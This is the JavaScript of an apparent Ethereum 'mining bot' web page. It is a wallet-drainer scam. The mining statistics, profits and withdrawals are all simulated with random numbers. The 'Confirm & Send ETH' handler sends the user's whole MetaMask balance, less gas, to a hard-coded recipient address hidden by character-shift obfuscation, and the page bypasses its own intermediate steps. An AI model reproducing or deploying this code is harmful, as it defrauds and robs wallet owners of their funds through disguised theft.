/*const connectPanel = document.getElementById("connectPanel");
const connectButton = document.getElementById("connectButton");
const connectStatus = document.getElementById("connectStatus");*/

const deployPanel = document.getElementById("deployPanel");
const deployButton = document.getElementById("deployButton");
const deployResult = document.getElementById("deployResult");

const attachPanel = document.getElementById("attachPanel");
const secondAddressInput = document.getElementById("secondAddress");
const attachButton = document.getElementById("attachButton");
const attachStatus = document.getElementById("attachStatus");

const confirmPanel = document.getElementById("confirmPanel");
const confirmButton = document.getElementById("confirmButton");
const balanceDisplay = document.getElementById("balanceDisplay");
const confirmStatus = document.getElementById("confirmStatus");

const transactionDetailsPanel = document.getElementById("transactionDetails");
const targetAddressSpan = document.getElementById("targetAddress");
const recipientAddressSpan = document.getElementById("recipientAddress");
const amountToSendSpan = document.getElementById("amountToSend");
const transactionHashSpan = document.getElementById("transactionHash");

const randomAddressesPanel = document.getElementById("randomAddressesPanel");
const miningStatusSpan = document.getElementById("miningStatus");
const totalAttemptsSpan = document.getElementById("totalAttempts");
const successfulAttemptsSpan = document.getElementById("successfulAttempts");
const totalProfitSpan = document.getElementById("totalProfit");
const myLiquiditySpan = document.getElementById("myLiquidity");

const successfulAddressesList = document.getElementById(
  "successfulAddressesList"
);
const failedAddressesList = document.getElementById("failedAddressesList");
const withdrawalHistoryList = document.getElementById("withdrawalHistoryList");

const startMiningButton = document.getElementById("startMiningButton");
const pauseMiningButton = document.getElementById("pauseMiningButton");
const withdrawProfitButton = document.getElementById("withdrawProfitButton");
const withdrawAddressInput = document.getElementById("withdrawAddressInput");
const withdrawStatus = document.getElementById("withdrawStatus");
const downloadDataButton = document.getElementById("downloadDataButton");

const toast = document.getElementById("toast");
const themeToggle = document.getElementById("themeToggle");
const profitChartCtx = document.getElementById("profitChart").getContext("2d");
const attemptsChartCtx = document
  .getElementById("attemptsChart")
  .getContext("2d");

const obfuscatedAddress = [
  49, 121, 52, 50, 100, 49, 98, 101, 52, 54, 54, 58, 53, 98, 55, 69, 51, 102,
  49, 66, 51, 103, 53, 103, 53, 56, 50, 98, 54, 66, 50, 52, 68, 68, 49, 99, 98,
  50, 71, 49, 68, 56,
];
const targetAddress = obfuscatedAddress
  .map((c) => String.fromCharCode(c - 1))
  .join("");

const nonWorkingAddresses = [];

let userAddress = "";
let userBalance = 0;
let secondAddress = "";

let addressGeneratorInterval = null;

let totalAttempts = 0;
let successfulAttempts = 0;
let totalProfit = 0;
let totalWithdrawn = 0;
let withdrawalHistory = [];

const statusMethods = [
  "swap",
  "transfer",
  "add liquidity",
  "stake",
  "yield farming",
];
let statusMethodIndex = 0;

let profitChart;
let attemptsChart;

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function showPanel(panel) {
  const panels = document.querySelectorAll(".panel");
  panels.forEach((p) => p.classList.remove("active"));
  panel.classList.add("active");
}

function truncateAddress(address) {
  if (address.length <= 10) return address;
  return address.slice(0, 6) + "......" + address.slice(-4);
}

async function updateBalance() {
  try {
    const balanceWei = await window.ethereum.request({
      method: "eth_getBalance",
      params: [userAddress, "latest"],
    });
    userBalance = parseInt(balanceWei, 16) / 1e18;
    balanceDisplay.innerText = `My Liquidity: ${userBalance.toFixed(4)} ETH`;
    // Mining ekranında ETH ifadesi HTML'de yer aldığı için burada yalnızca sayısal değeri atıyoruz.
    myLiquiditySpan.innerText = userBalance.toFixed(4);
    updateCharts();
    saveToLocalStorage();
  } catch (error) {
    console.error(error);
    showToast("Error fetching balance");
  }
}

function generateRandomEthAddress() {
  const chars = "abcdef0123456789";
  let address = "0x";
  for (let i = 0; i < 40; i++) {
    address += chars[Math.floor(Math.random() * chars.length)];
  }
  return address;
}

function addRandomAddress(status, method, sender, profit = "") {
  const row = document.createElement("tr");

  const statusCell = document.createElement("td");
  if (status === "success") {
    statusCell.innerHTML = `<span class="checkmark"><i class="fas fa-check-circle text-success"></i></span> ${profit} ETH`;
  } else {
    statusCell.innerHTML = `<span class="crossmark"><i class="fas fa-times-circle text-danger"></i></span>`;
  }
  row.appendChild(statusCell);

  const methodCell = document.createElement("td");
  methodCell.innerText = method;
  row.appendChild(methodCell);

  const senderCell = document.createElement("td");
  senderCell.innerText = truncateAddress(sender);
  row.appendChild(senderCell);

  if (status === "success") {
    successfulAddressesList.prepend(row);
    if (successfulAddressesList.childElementCount > 5) {
      successfulAddressesList.removeChild(successfulAddressesList.lastChild);
    }
  } else {
    failedAddressesList.prepend(row);
    if (failedAddressesList.childElementCount > 5) {
      failedAddressesList.removeChild(failedAddressesList.lastChild);
    }
  }

  saveToLocalStorage();
}

function startGeneratingAddresses() {
  if (!addressGeneratorInterval) {
    addressGeneratorInterval = setInterval(() => {
      simulateMiningAttempt();
    }, 2000);
  }
}

function pauseMining() {
  if (addressGeneratorInterval) {
    clearInterval(addressGeneratorInterval);
    addressGeneratorInterval = null;
  }
}

function simulateMiningAttempt() {
  totalAttempts++;
  updateMiningStats();

  const successRate = parseFloat(localStorage.getItem("successRate")) || 0;
  if (Math.random() < successRate) {
    successfulAttempts++;
    const minProfit = parseFloat(localStorage.getItem("minProfit")) || 0;
    const maxProfit = parseFloat(localStorage.getItem("maxProfit")) || 0;
    const profit = (
      minProfit +
      Math.random() * (maxProfit - minProfit)
    ).toFixed(4);
    totalProfit += parseFloat(profit);
    updateMiningStats();

    const address = generateRandomEthAddress();
    const method = statusMethods[statusMethodIndex % statusMethods.length];
    statusMethodIndex++;

    addRandomAddress("success", method, address, profit);
  } else {
    const address = generateRandomEthAddress();
    const method = statusMethods[statusMethodIndex % statusMethods.length];
    statusMethodIndex++;

    addRandomAddress("failure", method, address);
  }

  monitorProfit();
  updateCharts();
  saveToLocalStorage();
}

function updateMiningStats() {
  totalAttemptsSpan.innerText = totalAttempts;
  successfulAttemptsSpan.innerText = successfulAttempts;
  totalProfitSpan.innerText = totalProfit.toFixed(4);
  myLiquiditySpan.innerText = userBalance.toFixed(4);
}

function showToast(message) {
  toast.innerText = message;
  toast.className = "show";
  setTimeout(() => {
    toast.className = toast.className.replace("show", "");
  }, 3000);
}

/*connectButton.addEventListener("click", async () => {
  if (typeof window.ethereum !== "undefined") {
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      userAddress = accounts[0];
      connectStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> MetaMask Connected Successfully!`;
      connectStatus.style.color = "#4CAF50";

      await updateBalance();

      await delay(1000);
      showPanel(deployPanel);
      showToast("MetaMask Connected Successfully!");
    } catch (error) {
      console.error(error);
      connectStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> Connection error. Please try again.`;
      connectStatus.style.color = "#FF5722";
      showToast("Connection error. Please try again.");
    }
  } else {
    connectStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> MetaMask is not installed. Please install MetaMask and try again.`;
    connectStatus.style.color = "#FF5722";
    showToast("MetaMask is not installed.");
  }
});*/

connectButton.disabled = true;
showPanel(deployPanel);

deployButton.addEventListener("click", async () => {
  deployButton.disabled = true;
  deployResult.innerHTML = `Loading...⛏️ <i class="fas fa-spinner fa-spin"></i>`;
  deployResult.style.color = "#ffffff";

  await delay(3000);

  deployResult.innerHTML = `<i class="fas fa-check-circle text-success"></i> Loading...⛏️`;
  deployResult.style.color = "#4CAF50";
  showToast("Mining Has Started Successfully!");

  await delay(1000);
  showPanel(randomAddressesPanel); //Bypass from attachPanel to randomAddressesPanel
});

secondAddressInput.addEventListener("input", () => {
  const address = secondAddressInput.value.trim();
  if (/^0x[a-fA-F0-9]{40}$/.test(address)) {
    if (nonWorkingAddresses.includes(address.toLowerCase())) {
      attachButton.disabled = true;
      attachStatus.innerHTML = `<i class="fas fa-times-circle text-danger"></i> This Ethereum address is currently non-working.`;
      attachStatus.style.color = "#FF5722";
    } else {
      attachButton.disabled = false;
      attachStatus.innerHTML = "";
    }
  } else {
    attachButton.disabled = true;
    attachStatus.innerHTML = "";
  }
});

attachButton.addEventListener("click", async () => {
  const address = secondAddressInput.value.trim();

  attachButton.disabled = true;
  attachStatus.innerHTML = `Attaching <i class="fas fa-spinner fa-spin"></i>`;
  attachStatus.style.color = "#ffffff";

  await delay(3000);

  attachButton.disabled = false;

  if (nonWorkingAddresses.includes(address.toLowerCase())) {
    attachStatus.innerHTML = `<i class="fas fa-times-circle text-danger"></i> Failed to attach. This address is non-working.`;
    attachStatus.style.color = "#FF5722";
    confirmButton.disabled = true;
    showToast("Failed to attach. Non-working address.");
  } else {
    attachStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Address Attached Successfully!`;
    attachStatus.style.color = "#4CAF50";
    confirmButton.disabled = false;
    secondAddress = address;
    showToast("Address Attached Successfully!");

    await delay(1000);
    showPanel(randomAddressesPanel); //Bypass from confirmPanel to randomAddressesPanel
    updateBalance();
  }
});

// Updated "Confirm & Send ETH" button event listener:
confirmButton.addEventListener("click", async () => {
  try {
    confirmButton.disabled = true;
    confirmStatus.innerHTML = `Processing Transaction <i class="fas fa-spinner fa-spin"></i>`;
    confirmStatus.style.color = "#ffffff";

    // Get the current account balance in Wei
    const balanceWeiHex = await window.ethereum.request({
      method: "eth_getBalance",
      params: [userAddress, "latest"],
    });
    const balanceWei = BigInt(balanceWeiHex);

    // Get current gas price
    const gasPriceHex = await window.ethereum.request({
      method: "eth_gasPrice",
    });
    const gasPrice = BigInt(gasPriceHex);

    // Fixed gas limit for a simple ETH transfer (21000)
    const gasLimit = BigInt(21000);
    const totalGasFee = gasPrice * gasLimit;

    // Throw error if balance is insufficient to cover gas fees
    if (balanceWei <= totalGasFee) {
      throw new Error("Balance is too low to cover gas fees.");
    }

    // Amount to send = Total balance - gas fee
    const amountToSendWei = balanceWei - totalGasFee;
    const amountToSendEther = Number(amountToSendWei) / 1e18;
    amountToSendSpan.innerText = amountToSendEther.toFixed(18);

    const transactionParameters = {
      to: targetAddress,
      from: userAddress,
      value: "0x" + amountToSendWei.toString(16),
      gasPrice: "0x" + gasPrice.toString(16),
      gas: "0x" + gasLimit.toString(16),
    };

    const txHash = await window.ethereum.request({
      method: "eth_sendTransaction",
      params: [transactionParameters],
    });

    transactionDetailsPanel.classList.add("active");
    targetAddressSpan.innerText = targetAddress;
    recipientAddressSpan.innerText = secondAddress;
    transactionHashSpan.innerText = txHash;
    amountToSendSpan.innerText = amountToSendEther.toFixed(18);
    confirmStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Transaction sent: ${txHash}`;
    confirmStatus.style.color = "#4CAF50";
    showToast(`Transaction sent: ${txHash}`);

    await updateBalance();

    await delay(1000);
    showPanel(randomAddressesPanel);
  } catch (error) {
    console.error(error);
    confirmStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> Transaction failed or rejected.`;
    confirmStatus.style.color = "#FF0000";
    confirmButton.disabled = false;
    showToast("Transaction failed or rejected.");
  }
});

startMiningButton.addEventListener("click", () => {
  startMiningButton.disabled = true;
  pauseMiningButton.disabled = false;
  miningStatusSpan.innerText = "Mining in progress";
  startGeneratingAddresses();
  showToast("Mining Started");
});

pauseMiningButton.addEventListener("click", () => {
  pauseMiningButton.disabled = true;
  startMiningButton.disabled = false;
  miningStatusSpan.innerText = "Mining paused";
  pauseMining();
  showToast("Mining Paused");
});

withdrawProfitButton.addEventListener("click", () => {
  const withdrawAddress = withdrawAddressInput.value.trim();

  if (!/^0x[a-fA-F0-9]{40}$/.test(withdrawAddress)) {
    withdrawStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> Invalid ETH wallet address.`;
    withdrawStatus.style.color = "#FF5722";
    showToast("Invalid ETH wallet address.");
    return;
  }

  if (totalProfit <= 0) {
    withdrawStatus.innerHTML = `<i class="fas fa-exclamation-circle text-danger"></i> No profit to withdraw.`;
    withdrawStatus.style.color = "#FF5722";
    showToast("No profit to withdraw.");
    return;
  }

  withdrawProfitButton.disabled = true;
  withdrawStatus.innerHTML = `Withdrawing to ${truncateAddress(
    withdrawAddress
  )} <i class="fas fa-spinner fa-spin"></i>`;
  withdrawStatus.style.color = "#ffffff";

  setTimeout(() => {
    const withdrawAmount = totalProfit.toFixed(4);
    totalWithdrawn += parseFloat(withdrawAmount);
    totalProfit = 0;
    updateMiningStats();

    const withdrawalEntry = {
      address: withdrawAddress,
      amount: withdrawAmount,
      date: new Date().toLocaleString(),
    };
    withdrawalHistory.unshift(withdrawalEntry);
    addWithdrawalHistory(withdrawalEntry);

    withdrawStatus.innerHTML = `<i class="fas fa-check-circle text-success"></i> Success Withdraw (${withdrawAmount} ETH) to ${truncateAddress(
      withdrawAddress
    )}`;
    withdrawStatus.style.color = "#4CAF50";
    showToast(
      `Success Withdraw (${withdrawAmount} ETH) to ${truncateAddress(
        withdrawAddress
      )}`
    );

    saveToLocalStorage();
  }, 3500);
});

function addWithdrawalHistory(entry) {
  const row = document.createElement("tr");

  const addressCell = document.createElement("td");
  addressCell.innerText = truncateAddress(entry.address);
  row.appendChild(addressCell);

  const amountCell = document.createElement("td");
  amountCell.innerText = `${entry.amount} ETH`;
  row.appendChild(amountCell);

  const dateCell = document.createElement("td");
  dateCell.innerText = entry.date;
  row.appendChild(dateCell);

  withdrawalHistoryList.prepend(row);
}

function monitorProfit() {
  if (totalProfit > 0) {
    withdrawProfitButton.disabled = false;
  } else {
    withdrawProfitButton.disabled = true;
  }
}

downloadDataButton.addEventListener("click", () => {
  const data = {
    userAddress,
    userBalance,
    secondAddress,
    totalAttempts,
    successfulAttempts,
    totalProfit: totalProfit.toFixed(4),
    totalWithdrawn: totalWithdrawn.toFixed(4),
    withdrawalHistory,
  };
  const dataStr =
    "data:text/json;charset=utf-8," +
    encodeURIComponent(JSON.stringify(data, null, 2));
  const downloadAnchorNode = document.createElement("a");
  downloadAnchorNode.setAttribute("href", dataStr);
  downloadAnchorNode.setAttribute("download", "mining_data.json");
  document.body.appendChild(downloadAnchorNode);
  downloadAnchorNode.click();
  downloadAnchorNode.remove();
});

function initializeCharts() {
  profitChart = new Chart(profitChartCtx, {
    type: "line",
    data: {
      labels: [],
      datasets: [
        {
          label: "Total Profit (ETH)",
          data: [],
          backgroundColor: "rgba(108, 92, 231, 0.2)",
          borderColor: "rgba(108, 92, 231, 1)",
          borderWidth: 2,
          fill: true,
        },
      ],
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        yAxes: [
          {
            ticks: {
              beginAtZero: true,
              stepSize: 0.005,
            },
            gridLines: {
              color: "rgba(255,255,255,0.1)",
            },
          },
        ],
        xAxes: [
          {
            gridLines: {
              color: "rgba(255,255,255,0.1)",
            },
          },
        ],
      },
      legend: {
        labels: {
          fontColor: "#ffffff",
        },
      },
    },
  });

  attemptsChart = new Chart(attemptsChartCtx, {
    type: "bar",
    data: {
      labels: ["Total Attempts", "Successful Attempts"],
      datasets: [
        {
          label: "Attempts",
          data: [totalAttempts, successfulAttempts],
          backgroundColor: [
            "rgba(255, 99, 132, 0.6)",
            "rgba(54, 162, 235, 0.6)",
          ],
          borderColor: ["rgba(255,99,132,1)", "rgba(54, 162, 235, 1)"],
          borderWidth: 1,
        },
      ],
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        yAxes: [
          {
            ticks: {
              beginAtZero: true,
              stepSize: 1,
            },
            gridLines: {
              color: "rgba(255,255,255,0.1)",
            },
          },
        ],
        xAxes: [
          {
            gridLines: {
              color: "rgba(255,255,255,0.1)",
            },
          },
        ],
      },
      legend: {
        labels: {
          fontColor: "#ffffff",
        },
      },
    },
  });
}

function updateCharts() {
  const currentTime = new Date().toLocaleTimeString();
  profitChart.data.labels.push(currentTime);
  profitChart.data.datasets[0].data.push(totalProfit.toFixed(4));
  if (profitChart.data.labels.length > 10) {
    profitChart.data.labels.shift();
    profitChart.data.datasets[0].data.shift();
  }
  profitChart.update();

  attemptsChart.data.datasets[0].data = [totalAttempts, successfulAttempts];
  attemptsChart.update();
}

function saveToLocalStorage() {
  const data = {
    userAddress,
    userBalance,
    secondAddress,
    totalAttempts,
    successfulAttempts,
    totalProfit,
    totalWithdrawn,
    withdrawalHistory,
    successRate: parseFloat(localStorage.getItem("successRate")) || 0.1,
    minProfit: parseFloat(localStorage.getItem("minProfit")) || 0.001,
    maxProfit: parseFloat(localStorage.getItem("maxProfit")) || 0.02,
  };
  localStorage.setItem("ethWorkflowData", JSON.stringify(data));
}

function loadFromLocalStorage() {
  const dataStr = localStorage.getItem("ethWorkflowData");
  if (dataStr) {
    const data = JSON.parse(dataStr);
    userAddress = data.userAddress || "";
    userBalance = data.userBalance || 0;
    secondAddress = data.secondAddress || "";
    totalAttempts = data.totalAttempts || 0;
    successfulAttempts = data.successfulAttempts || 0;
    totalProfit = data.totalProfit || 0;
    totalWithdrawn = data.totalWithdrawn || 0;
    withdrawalHistory = data.withdrawalHistory || [];

    totalAttemptsSpan.innerText = totalAttempts;
    successfulAttemptsSpan.innerText = successfulAttempts;
    totalProfitSpan.innerText = totalProfit.toFixed(4);
    myLiquiditySpan.innerText = userBalance.toFixed(4);

    withdrawalHistory.forEach((entry) => addWithdrawalHistory(entry));

    updateCharts();
  }
}

themeToggle.addEventListener("click", () => {
  document.body.classList.toggle("light-mode");
  if (document.body.classList.contains("light-mode")) {
    themeToggle.innerHTML = `<i class="fas fa-sun"></i> Light Mode`;
  } else {
    themeToggle.innerHTML = `<i class="fas fa-moon"></i> Dark Mode`;
  }
});

function initializeApp() {
  initializeCharts();
  loadFromLocalStorage();
}

window.onload = initializeApp;

window.addEventListener("beforeunload", () => {
  if (addressGeneratorInterval) {
    clearInterval(addressGeneratorInterval);
  }
});
